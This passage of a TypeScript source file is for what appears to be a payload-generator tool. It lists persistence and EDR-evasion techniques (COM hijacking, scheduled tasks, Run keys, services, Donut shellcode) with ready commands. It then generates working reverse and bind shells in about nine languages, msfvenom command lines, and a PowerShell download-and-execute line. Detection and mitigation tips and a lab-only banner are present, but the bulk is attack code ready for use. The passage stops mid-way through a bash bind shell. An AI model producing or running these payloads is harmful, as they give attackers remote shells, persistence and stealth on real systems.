    description: '.NET to shellcode generator for in-memory execution — a modern EDR evasion tool.',
    whatItDoes: 'Converts .NET assemblies to position-independent shellcode that executes in memory.',
    howToUse: 'Generate shellcode with Donut, execute in-memory using various loaders.',
    whereToUse: 'Bypassing EDR, executing .NET payloads without disk writes.',
    pros: ['Bypasses many EDR solutions', 'Executes from memory', 'Works with .NET payloads'],
    cons: ['Requires Donut tool', 'May be detected by advanced EDR', 'Complex setup'],
    icon: <Code size={18} />,
    color: 'text-rose-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['raw_c', 'csharp', 'python'],
    howItWorks: 'Donut converts .NET assemblies to shellcode using process injection and AMSI bypass techniques.',
    exampleScenario: 'Convert a Cobalt Strike Beacon to shellcode and execute in-memory using a custom loader.',
    commonListenerCommand: 'donut.exe -a 2 -f 1 -i payload.exe',
    detectionIndicators: [
      'Process injection events',
      'Unusual RWX memory allocations',
      'Known Donut patterns in memory',
    ],
    mitigationTips: [
      'Enable memory scanning in EDR',
      'Monitor process injection events',
      'Use Controlled Folder Access',
    ],
    references: ['https://github.com/TheWover/donut', 'https://attack.mitre.org/techniques/T1055/'],
    isComplete: false,
    labVsReal: 'Donut is a heavily used tool in both labs and real red team operations for converting .NET payloads to shellcode for in-memory execution.',
    detectionComplexity: 'High',
    stealthRating: 'High',
    reliabilityRating: 'High',
  },
  // 34. COM Hijacking
  {
    type: 'com_hijack',
    name: 'COM Hijacking Persistence',
    category: 'Persistence',
    description: 'COM object hijacking for persistence and privilege escalation.',
    whatItDoes: 'Modifies COM registry entries to execute arbitrary code when a COM object is instantiated.',
    howToUse: 'Find COM object, replace InprocServer32/ClassId to point to malicious DLL.',
    whereToUse: 'Persistence, privilege escalation, bypassing security controls.',
    pros: ['Very stealthy', 'Persistence across reboots', 'Bypasses many security tools'],
    cons: ['Requires admin privileges to modify registry', 'Complex to discover COM objects', 'Can break applications'],
    icon: <GitMerge size={18} />,
    color: 'text-red-400',
    defaultPort: 0,
    requiresLhost: false,
    requiresLport: false,
    supportedFormats: ['csharp', 'raw_c'],
    howItWorks: 'Registry key (HKCR/CLSID) is modified to point to a malicious DLL, which is loaded when the COM object is invoked.',
    exampleScenario: 'Hijack the COM object for Windows Search to maintain persistence without being detected.',
    commonListenerCommand: 'N/A - registry modification for persistence',
    detectionIndicators: [
      'Registry modifications to COM keys',
      'Unusual DLLs loaded via COM',
      'Unusual process creation during COM operations',
    ],
    mitigationTips: [
      'Monitor COM registry modifications',
      'Use Windows Defender Exploit Guard',
      'Implement application whitelisting',
    ],
    references: ['https://attack.mitre.org/techniques/T1546/', 'https://www.trustedsec.com/blog/com-hijacking/'],
    isComplete: false,
    labVsReal: 'COM hijacking is an advanced persistence technique used in both labs and real red team operations for stealthy, long-term access.',
    detectionComplexity: 'High',
    stealthRating: 'High',
    reliabilityRating: 'Medium',
  },
  // 35. Task Scheduler Persistence
  {
    type: 'task_scheduler_persistence',
    name: 'Task Scheduler Persistence',
    category: 'Persistence',
    description: 'Uses Windows Task Scheduler to maintain persistence — a classic technique.',
    whatItDoes: 'Creates scheduled tasks that run malicious code at boot or user logon.',
    howToUse: 'Use schtasks.exe or PowerShell to create a scheduled task.',
    whereToUse: 'Persistence across reboots, maintaining access on Windows systems.',
    pros: ['Stealthy persistence', 'Can run as SYSTEM', 'Supports triggers (boot, logon, idle)'],
    cons: ['Requires admin for SYSTEM tasks', 'Logged in event logs', 'Can be detected by EDR'],
    icon: <Clock size={18} />,
    color: 'text-amber-400',
    defaultPort: 0,
    requiresLhost: false,
    requiresLport: false,
    supportedFormats: ['powershell', 'csharp', 'batch'],
    howItWorks: 'Uses Task Scheduler API (schtasks.exe) to create a task that runs on logon or at system startup.',
    exampleScenario: 'Create a scheduled task to run a reverse shell every 5 minutes to maintain persistence.',
    commonListenerCommand: 'schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\payload.exe" /sc onlogon /ru SYSTEM',
    detectionIndicators: [
      'Unusual scheduled tasks (schtasks.exe)',
      'Scheduled tasks with suspicious names or paths',
      'Tasks running from temp directories',
    ],
    mitigationTips: [
      'Monitor scheduled task creation',
      'Restrict schtasks.exe execution',
      'Audit scheduled task logs',
    ],
    references: ['https://attack.mitre.org/techniques/T1053/', 'https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page/'],
    isComplete: false,
    labVsReal: 'Task Scheduler persistence is a common lab technique and is still widely used in real engagements for maintaining access on Windows systems.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 36. Registry Run Persistence
  {
    type: 'registry_persistence',
    name: 'Registry Run Persistence',
    category: 'Persistence',
    description: 'Uses Windows Registry Run keys for persistence — the old reliable.',
    whatItDoes: 'Adds malicious entry to registry Run keys (HKLM/HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run).',
    howToUse: 'Create registry entry using reg.exe, PowerShell, or C#.',
    whereToUse: 'Persistence across logons, maintaining access on Windows.',
    pros: ['Stealthy', 'Runs on user logon', 'Easy to implement'],
    cons: ['Heavily monitored by security tools', 'Requires admin for HKLM', 'Often flagged'],
    icon: <Database size={18} />,
    color: 'text-cyan-400',
    defaultPort: 0,
    requiresLhost: false,
    requiresLport: false,
    supportedFormats: ['powershell', 'batch', 'csharp'],
    howItWorks: 'Adds a registry value pointing to the payload in Run or RunOnce keys, executed on user logon.',
    exampleScenario: 'Add a key to HKCU\\...\\Run that points to a backdoor executable for persistence.',
    commonListenerCommand: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "LegitApp" /t REG_SZ /d "C:\\Users\\Public\\backdoor.exe"',
    detectionIndicators: [
      'Registry modifications to Run keys',
      'Suspicious entries in Run keys',
      'Autoruns showing unknown entries',
    ],
    mitigationTips: [
      'Monitor registry changes in Run keys',
      'Use autoruns monitoring tools',
      'Audit registry changes',
    ],
    references: ['https://attack.mitre.org/techniques/T1547/'],
    isComplete: false,
    labVsReal: 'Registry persistence is a classic lab technique and is still used in real engagements, though it\'s heavily monitored by EDR.',
    detectionComplexity: 'Low',
    stealthRating: 'Low',
    reliabilityRating: 'High',
  },
  // 37. Service Persistence
  {
    type: 'service_persistence',
    name: 'Windows Service Persistence',
    category: 'Persistence',
    description: 'Creates a Windows service for persistence — runs with SYSTEM privileges.',
    whatItDoes: 'Creates a new Windows service that runs malicious code on boot.',
    howToUse: 'Use sc.exe, PowerShell, or C# to create a service.',
    whereToUse: 'Persistence across reboots, running as SYSTEM.',
    pros: ['Runs as SYSTEM (high privileges)', 'Persists across reboots', 'Looks like legitimate service'],
    cons: ['Requires admin privileges', 'Heavily monitored', 'Event logs record service creation'],
    icon: <Server size={18} />,
    color: 'text-blue-400',
    defaultPort: 0,
    requiresLhost: false,
    requiresLport: false,
    supportedFormats: ['csharp', 'powershell', 'batch'],
    howItWorks: 'Creates a new service using sc.exe or PowerShell that executes the payload on system start.',
    exampleScenario: 'Create a service named "WindowsUpdate" that runs a reverse shell as SYSTEM.',
    commonListenerCommand: 'sc create WindowsUpdate binPath= "C:\\Users\\Public\\payload.exe" start= auto',
    detectionIndicators: [
      'New service creation (sc.exe)',
      'Services with suspicious names or paths',
      'Services running from temp directories',
    ],
    mitigationTips: [
      'Monitor service creation events',
      'Restrict sc.exe execution',
      'Audit service creation logs',
    ],
    references: ['https://attack.mitre.org/techniques/T1543/', 'https://docs.microsoft.com/en-us/windows/win32/services/services'],
    isComplete: false,
    labVsReal: 'Service persistence is a common lab technique and is widely used in real engagements for SYSTEM-level persistence.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 38. AWS EC2 Reverse Shell
  {
    type: 'aws_ec2_reverse',
    name: 'AWS EC2 Reverse Shell',
    category: 'Cloud / Container',
    description: 'Reverse shell tailored for AWS EC2 instances — cloud-native access.',
    whatItDoes: 'Establishes a reverse shell from an EC2 instance using cloud-friendly methods.',
    howToUse: 'Deploy via user-data, SSM, or direct execution on the EC2 instance.',
    whereToUse: 'Cloud pentesting, AWS environment assessments.',
    pros: ['Works in cloud environments', 'Can leverage instance metadata', 'Bypasses some traditional controls'],
    cons: ['Requires instance access', 'Cloud logging may capture activity', 'Limited by IAM permissions'],
    icon: <Cloud size={18} />,
    color: 'text-orange-300',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['python', 'bash', 'go'],
    howItWorks: 'Uses Python or bash to connect back to a listener, often using instance metadata for reconnaissance.',
    exampleScenario: 'Gain initial access to an EC2 instance via a vulnerable web app, then establish a reverse shell.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Unusual outbound connections from EC2 instances',
      'Instance metadata queries from non-standard sources',
      'User-data script modifications',
    ],
    mitigationTips: [
      'Restrict outbound traffic from EC2 instances',
      'Monitor CloudTrail for suspicious API calls',
      'Use AWS GuardDuty for threat detection',
    ],
    references: ['https://attack.mitre.org/techniques/T1071/', 'https://aws.amazon.com/security/'],
    isComplete: false,
    labVsReal: 'AWS reverse shells are increasingly common in real cloud-focused red team engagements as more organizations move to the cloud.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 39. GCP Compute Reverse Shell
  {
    type: 'gcp_compute_reverse',
    name: 'GCP Compute Reverse Shell',
    category: 'Cloud / Container',
    description: 'Reverse shell for Google Cloud Compute Engine VMs.',
    whatItDoes: 'Opens a reverse shell from a GCP VM using Python or bash.',
    howToUse: 'Execute on the VM via SSH, serial console, or startup script.',
    whereToUse: 'Cloud pentesting, GCP environment assessments.',
    pros: ['Works in GCP environments', 'Leverages metadata service', 'Can use cloud SDK'],
    cons: ['Requires VM access', 'Cloud logging captures activity', 'Limited by IAM'],
    icon: <Cloud size={18} />,
    color: 'text-blue-300',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['python', 'bash'],
    howItWorks: 'Uses Python socket or bash /dev/tcp to connect back, often using GCP metadata for reconnaissance.',
    exampleScenario: 'Access a GCP VM via a compromised service account, then establish a reverse shell.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Unusual outbound connections from GCP VMs',
      'Metadata queries from non-standard sources',
      'Startup script modifications',
    ],
    mitigationTips: [
      'Restrict outbound traffic from VMs',
      'Monitor Cloud Audit Logs',
      'Use VPC firewall rules',
    ],
    references: ['https://attack.mitre.org/techniques/T1071/', 'https://cloud.google.com/security/'],
    isComplete: false,
    labVsReal: 'GCP reverse shells are used in real cloud red team engagements targeting Google Cloud environments.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 40. Azure VM Reverse Shell
  {
    type: 'azure_vm_reverse',
    name: 'Azure VM Reverse Shell',
    category: 'Cloud / Container',
    description: 'Reverse shell for Azure Virtual Machines.',
    whatItDoes: 'Establishes a reverse shell from an Azure VM using Python, PowerShell, or bash.',
    howToUse: 'Deploy via VM extensions, custom script, or direct execution.',
    whereToUse: 'Cloud pentesting, Azure environment assessments.',
    pros: ['Works in Azure environments', 'Leverages Instance Metadata Service (IMDS)', 'Can use Azure CLI'],
    cons: ['Requires VM access', 'Azure logging captures activity', 'Limited by RBAC'],
    icon: <Cloud size={18} />,
    color: 'text-blue-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['powershell', 'python', 'bash'],
    howItWorks: 'Uses Python, PowerShell, or bash to connect back to a listener, often using IMDS for reconnaissance.',
    exampleScenario: 'Compromise an Azure VM via a vulnerable web app, then establish a reverse shell.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Unusual outbound connections from Azure VMs',
      'IMDS queries from non-standard sources',
      'Custom script extension activity',
    ],
    mitigationTips: [
      'Restrict outbound traffic using NSGs',
      'Monitor Azure Activity Logs',
      'Use Azure Sentinel for threat detection',
    ],
    references: ['https://attack.mitre.org/techniques/T1071/', 'https://azure.microsoft.com/en-us/security/'],
    isComplete: false,
    labVsReal: 'Azure reverse shells are increasingly common in real cloud-focused red team engagements.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 41. Docker Reverse Shell
  {
    type: 'docker_reverse',
    name: 'Docker Container Reverse Shell',
    category: 'Cloud / Container',
    description: 'Reverse shell from within a Docker container.',
    whatItDoes: 'Opens a reverse shell from a compromised container to your listener.',
    howToUse: 'Execute within a container via exec or entrypoint.',
    whereToUse: 'Container pentesting, Kubernetes environments.',
    pros: ['Works in containerized environments', 'Can escape containers in some cases', 'Lightweight'],
    cons: ['Container may have limited tools', 'Often runs with minimal privileges', 'Container logs may capture activity'],
    icon: <Cpu size={18} />,
    color: 'text-sky-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['bash', 'python', 'go'],
    howItWorks: 'Uses bash /dev/tcp or Python socket to connect back from within the container.',
    exampleScenario: 'Compromise a container via a vulnerable application, then establish a reverse shell.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Unusual outbound connections from containers',
      'Container logs showing shell activity',
      'Suspicious container processes',
    ],
    mitigationTips: [
      'Run containers with minimal privileges',
      'Use container security scanning',
      'Monitor container logs for anomalies',
    ],
    references: ['https://attack.mitre.org/techniques/T1071/', 'https://docs.docker.com/security/'],
    isComplete: false,
    labVsReal: 'Docker reverse shells are common in labs and increasingly used in real engagements targeting containerized environments.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 42. Kubernetes Exec Shell
  {
    type: 'kubernetes_exec',
    name: 'Kubernetes Exec Shell',
    category: 'Cloud / Container',
    description: 'Executes a shell in a Kubernetes pod — container orchestration access.',
    whatItDoes: 'Uses kubectl exec to get a shell in a pod, or creates a privileged pod.',
    howToUse: 'Requires kubectl access or compromised service account.',
    whereToUse: 'Kubernetes pentesting, cloud-native assessments.',
    pros: ['Native Kubernetes access', 'Can access cluster resources', 'Powerful for pivoting'],
    cons: ['Requires Kubernetes access', 'Heavily logged in audit logs', 'May be monitored by security tools'],
    icon: <Network size={18} />,
    color: 'text-blue-500',
    defaultPort: 0,
    requiresLhost: false,
    requiresLport: false,
    supportedFormats: ['bash', 'python', 'go'],
    howItWorks: 'Uses kubectl exec to run a shell in a pod, or creates a privileged pod for cluster access.',
    exampleScenario: 'Compromise a service account with kubectl access, then exec into pods to gather credentials.',
    commonListenerCommand: 'kubectl exec -it pod-name -- /bin/bash',
    detectionIndicators: [
      'Kubernetes API calls to exec endpoints',
      'Privileged pod creation',
      'Unusual service account activity',
    ],
    mitigationTips: [
      'Use RBAC to limit kubectl exec access',
      'Enable Kubernetes audit logging',
      'Use Pod Security Policies/Standards',
    ],
    references: ['https://attack.mitre.org/techniques/T1059/', 'https://kubernetes.io/docs/concepts/security/'],
    isComplete: false,
    labVsReal: 'Kubernetes exec shells are a key technique in cloud-native red team engagements targeting container orchestration platforms.',
    detectionComplexity: 'High',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 43. Python WebSocket Shell
  {
    type: 'python_websocket_shell',
    name: 'Python WebSocket Shell',
    category: 'Reverse Shells',
    description: 'Reverse shell over WebSockets — modern, browser-friendly C2.',
    whatItDoes: 'Uses WebSockets for bidirectional communication, works through firewalls.',
    howToUse: 'Set up a WebSocket server, generate payload, run on target.',
    whereToUse: 'When you need a modern, browser-compatible C2 channel.',
    pros: ['Works through firewalls', 'Browser-compatible', 'Supports binary data'],
    cons: ['Requires WebSocket library', 'Less common than HTTP(S)', 'May be detected by some proxies'],
    icon: <Wifi size={18} />,
    color: 'text-green-400',
    defaultPort: 8080,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['python', 'javascript'],
    howItWorks: 'Uses WebSockets (WS or WSS) for command and control, with subprocess for command execution.',
    exampleScenario: 'Establish a WebSocket-based C2 channel from a compromised server to evade traditional detection.',
    commonListenerCommand: 'python websocket_server.py --port ${lport}',
    detectionIndicators: [
      'Unusual WebSocket connections from processes',
      'Long-lived WebSocket sessions to external servers',
      'WebSocket payloads with command execution patterns',
    ],
    mitigationTips: [
      'Monitor WebSocket traffic for anomalies',
      'Use web proxies with WebSocket inspection',
      'Block external WebSocket connections where possible',
    ],
    references: ['https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API', 'https://attack.mitre.org/techniques/T1071/'],
    isComplete: false,
    labVsReal: 'WebSocket shells are increasingly common in modern labs and real engagements due to their ability to blend in with legitimate web traffic.',
    detectionComplexity: 'High',
    stealthRating: 'High',
    reliabilityRating: 'High',
  },
  // 44. Rust Reverse Shell
  {
    type: 'rust_reverse',
    name: 'Rust Reverse Shell',
    category: 'Reverse Shells',
    description: 'Reverse shell written in Rust — modern, memory-safe, and cross-platform.',
    whatItDoes: 'Opens a reverse shell using Rust\'s standard library, compiled to a native executable.',
    howToUse: 'Compile the Rust code, execute on target. Works on Windows, macOS, Linux.',
    whereToUse: 'When you need a small, cross-platform executable with minimal dependencies.',
    pros: ['Cross-platform (Windows/macOS/Linux)', 'Memory-safe', 'Small executable size', 'No external dependencies'],
    cons: ['Requires Rust compiler to build', 'Less common than other languages', 'May be flagged by some AV'],
    icon: <Braces size={18} />,
    color: 'text-orange-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['rust'],
    howItWorks: 'Uses Rust\'s std::net and std::process to establish a TCP connection and spawn a shell.',
    exampleScenario: 'Deploy a Rust reverse shell to a cross-platform environment where you need a reliable, lightweight payload.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Unusual Rust-compiled executables',
      'Processes with Rust-specific memory patterns',
      'Network connections from unusual executables',
    ],
    mitigationTips: [
      'Monitor for unknown executables',
      'Use EDR with behavioral detection',
      'Restrict outbound connections from endpoints',
    ],
    references: ['https://www.rust-lang.org/', 'https://attack.mitre.org/techniques/T1059/'],
    isComplete: false,
    labVsReal: 'Rust reverse shells are gaining popularity in both labs and real engagements due to Rust\'s cross-platform capabilities and memory safety.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
];

// ─── Build lookup map ─────────────────────────────────────
const PAYLOAD_BY_TYPE: Record<PayloadType, PayloadInfo> = PAYLOAD_ENCYCLOPEDIA.reduce(
  (acc, p) => ({ ...acc, [p.type]: p }),
  {} as Record<PayloadType, PayloadInfo>
);

// ─── Generator ─────────────────────────────────────────────
function buildMsfvenomCommand(
  type: PayloadType,
  format: OutputFormat,
  lhost: string,
  lport: number
): string | null {
  const map: Partial<Record<PayloadType, { payload: string; outExt: string }>> = {
    reverse_shell: { payload: 'linux/x64/shell_reverse_tcp', outExt: 'elf' },
    meterpreter: { payload: 'windows/x64/meterpreter/reverse_tcp', outExt: 'exe' },
    bind_shell: { payload: 'linux/x64/shell_bind_tcp', outExt: 'elf' },
    reverse_https: { payload: 'windows/x64/meterpreter/reverse_https', outExt: 'exe' },
    reverse_http: { payload: 'windows/x64/meterpreter/reverse_http', outExt: 'exe' },
    powershell_encoded: { payload: 'windows/x64/meterpreter/reverse_tcp', outExt: 'ps1' },
    shellcode: { payload: 'windows/x64/meterpreter/reverse_tcp', outExt: 'bin' },
  };
  const entry = map[type];
  if (!entry) return null;

  let msfFormat = 'raw';
  if (format === 'powershell') msfFormat = 'psh';
  else if (format === 'csharp') msfFormat = 'csharp';
  else if (format === 'python') msfFormat = 'python';
  else if (format === 'raw_c') msfFormat = 'c';
  else if (format === 'bash') msfFormat = 'raw';
  else if (type === 'shellcode') msfFormat = 'raw';
  else if (type === 'meterpreter') msfFormat = 'exe';

  const lhostFlag = type === 'bind_shell' ? '' : ` LHOST=${lhost}`;
  return `msfvenom -p ${entry.payload}${lhostFlag} LPORT=${lport} -f ${msfFormat} -o ${type}.${entry.outExt}`;
}

interface HistoryEntry {
  id: string;
  at: number;
  type: PayloadType;
  format: OutputFormat;
  lhost: string;
  lport: number;
  snippet: string;
}

function generatePayloadCode(
  type: PayloadType,
  format: OutputFormat,
  lhost: string,
  lport: number,
  obfuscation: ObfuscationLevel
): string {
  const base = `// ${type.toUpperCase()} Payload - ${format} - ${obfuscation} obfuscation
// LHOST: ${lhost} | LPORT: ${lport}
// ⚠️ LAB / AUTHORIZED USE ONLY — unauthorized use is illegal

`;

  let rawCode = '';

  switch (type) {
    case 'reverse_shell': {
      switch (format) {
        case 'python':
          rawCode = base + `import socket, subprocess, os, sys

def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("${lhost}", ${lport}))
        # Redirect stdin, stdout, stderr to the socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        # Spawn a shell
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        sys.exit(1)

if __name__ == "__main__":
    reverse_shell()`;
          break;
        case 'powershell':
          rawCode = base + `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()`;
          break;
        case 'go':
          rawCode = base + `package main

import (
    "net"
    "os/exec"
)

func main() {
    conn, err := net.Dial("tcp", "${lhost}:${lport}")
    if err != nil {
        return
    }
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}`;
          break;
        case 'raw_c':
          rawCode = base + `#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(${lport});
    sin.sin_addr.s_addr = inet_addr("${lhost}");
    connect(sock, (struct sockaddr*)&sin, sizeof(sin));
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execve("/bin/sh", NULL, NULL);
    return 0;
}`;
          break;
        case 'csharp':
          rawCode = base + `using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;

class Program {
    static void Main() {
        using (var client = new TcpClient("${lhost}", ${lport}))
        using (var stream = client.GetStream())
        using (var reader = new StreamReader(stream))
        using (var writer = new StreamWriter(stream) { AutoFlush = true }) {
            while (true) {
                writer.Write("cmd> ");
                var line = reader.ReadLine();
                if (string.IsNullOrEmpty(line) || line == "exit") break;
                var p = new Process {
                    StartInfo = new ProcessStartInfo("cmd.exe", "/c " + line) {
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
                p.Start();
                writer.Write(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
            }
        }
    }
}`;
          break;
        case 'bash':
          rawCode = base + `#!/bin/bash
# Classic bash reverse shell using /dev/tcp
bash -i >& /dev/tcp/${lhost}/${lport} 0>&1

# Fallback: Python if /dev/tcp unavailable
# python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
          break;
        case 'perl':
          rawCode = base + `#!/usr/bin/perl
use Socket;
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
connect(S, sockaddr_in(${lport}, inet_aton("${lhost}")));
open(STDIN, ">&S");
open(STDOUT, ">&S");
open(STDERR, ">&S");
exec("/bin/sh -i");`;
          break;
        case 'ruby':
          rawCode = base + `#!/usr/bin/env ruby
require 'socket'
s = TCPSocket.new("${lhost}", ${lport})
loop do
    cmd = s.gets
    IO.popen(cmd, "r") { |io| s.print io.read }
end`;
          break;
        case 'rust':
          rawCode = base + `use std::net::TcpStream;
use std::os::unix::io::AsRawFd;
use std::process::{Command, Stdio};

fn main() {
    if let Ok(stream) = TcpStream::connect("${lhost}:${lport}") {
        let fd = stream.as_raw_fd();
        Command::new("/bin/sh")
            .stdin(Stdio::from_raw_fd(fd))
            .stdout(Stdio::from_raw_fd(fd))
            .stderr(Stdio::from_raw_fd(fd))
            .status()
            .ok();
    }
}`;
          break;
        default:
          rawCode = base + `// ${type} payload in ${format} format not yet implemented`;
      }
      break;
    }
    case 'meterpreter': {
      switch (format) {
        case 'csharp':
          rawCode = base + `// Meterpreter C# (Reflective DLL)
// Compile with: csc /target:library /out:payload.dll payload.cs
// Use with: msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${lhost}; set LPORT ${lport}; exploit"

using System;
using System.Runtime.InteropServices;

namespace Meterpreter {
    public class Payload {
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        public static void Run() {
            // Placeholder: replace with actual Meterpreter shellcode
            byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc };
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}`;
          break;
        case 'python':
          rawCode = base + `# Meterpreter Python (using pymsf)
# This is a placeholder. Real Meterpreter is not available in pure Python.
# Use msfvenom to generate Meterpreter in other formats.
# Example: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f python -v shellcode

print("Meterpreter not available in Python. Use msfvenom for actual payload.")
# shellcode = b""  # Paste msfvenom output here`;
          break;
        case 'powershell':
          rawCode = base + `# Meterpreter PowerShell via Invoke-Metasploit
# Download and execute meterpreter payload from a remote server.
# This is a placeholder — use msfvenom to generate actual PowerShell payload.

$url = "http://${lhost}:${lport}/payload.ps1"
IEX (New-Object Net.WebClient).DownloadString($url)`;
          break;
        default:
          rawCode = base + `// Meterpreter not implemented for ${format}`;
      }
      break;
    }
    case 'bind_shell': {
      switch (format) {
        case 'powershell':
          rawCode = base + `$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', ${lport});
$listener.Start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String);
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
$client.Close(); $listener.Stop()`;
          break;
        case 'csharp':
          rawCode = base + `using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;

class BindShell {
    static void Main() {
        var listener = new TcpListener(IPAddress.Any, ${lport});
        listener.Start();
        using (var client = listener.AcceptTcpClient())
        using (var stream = client.GetStream())
        using (var reader = new StreamReader(stream))
        using (var writer = new StreamWriter(stream) { AutoFlush = true }) {
            while (true) {
                writer.Write("cmd> ");
                var line = reader.ReadLine();
                if (string.IsNullOrEmpty(line) || line == "exit") break;
                var p = new Process {
                    StartInfo = new ProcessStartInfo("cmd.exe", "/c " + line) {
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
                p.Start();
                writer.Write(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
            }
        }
        listener.Stop();
    }
}`;
          break;
        case 'raw_c':
          rawCode = base + `#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port = htons(${lport});
    a.sin_addr.s_addr = INADDR_ANY;
    bind(s, (struct sockaddr*)&a, sizeof(a));
    listen(s, 1);
    int c = accept(s, NULL, NULL);
    dup2(c, 0);
    dup2(c, 1);
    dup2(c, 2);
    execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
    return 0;
}`;
          break;
        case 'python':
          rawCode = base + `import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', ${lport}))
s.listen(1)
conn, addr = s.accept()
os.dup2(conn.fileno(), 0)
os.dup2(conn.fileno(), 1)
os.dup2(conn.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])`;
          break;
        case 'bash':
          rawCode = base + `#!/bin/bash
# Bind shell — connect with: nc <target-ip> ${lport}
while true; do
